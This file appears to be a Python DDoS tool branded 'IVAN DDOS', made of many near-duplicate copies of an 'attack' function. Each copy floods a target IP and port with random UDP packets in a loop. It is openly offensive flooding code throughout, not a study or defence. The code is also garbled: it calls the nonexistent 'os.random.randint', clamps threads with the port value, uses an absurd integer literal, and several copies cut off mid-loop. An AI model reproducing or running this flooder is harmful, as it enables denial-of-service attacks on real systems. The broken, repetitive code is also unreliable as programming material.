def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
